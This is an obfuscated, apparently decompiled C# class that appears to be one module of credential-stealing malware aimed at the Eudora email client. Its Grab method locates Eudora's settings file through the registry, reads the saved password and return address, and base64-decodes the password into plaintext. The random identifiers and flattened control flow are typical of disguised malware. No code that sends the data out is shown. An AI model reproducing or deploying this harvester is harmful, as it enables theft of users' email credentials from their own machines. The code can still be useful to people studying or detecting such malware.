using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.Win32;
using p3N5Y;
using ppkr;

namespace ZAZUx;

public class HAx0 : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string pSLxBS4
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public HAx0()
	{
		pSLxBS4 = "Eudora";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Qualcomm\\Eudora\\CommandLine\\");
			if (registryKey == null)
			{
				return list;
			}
			string text = (string)registryKey.GetValue("current");
			if (string.IsNullOrEmpty(text))
			{
				return list;
			}
			string[] array = text.Split(new char[1] { ' ' });
			string lpFileName = array[2];
			StringBuilder stringBuilder = new StringBuilder(500);
			gVe3wBP.GetPrivateProfileString("Settings", "SavePasswordText", "", stringBuilder, stringBuilder.Capacity, lpFileName);
			StringBuilder stringBuilder2 = new StringBuilder(500);
			gVe3wBP.GetPrivateProfileString("Settings", "ReturnAddress", "", stringBuilder2, stringBuilder2.Capacity, lpFileName);
			list.Add(new ii68
			{
				byIdLuuGZbL = "-",
				oVAe = pSLxBS4,
				_9H5rP7hg2 = Encoding.UTF8.GetString(Convert.FromBase64String(stringBuilder.ToString())),
				S8v = stringBuilder2.ToString()
			});
			return list;
		}
		catch
		{
			return list;
		}
	}
}
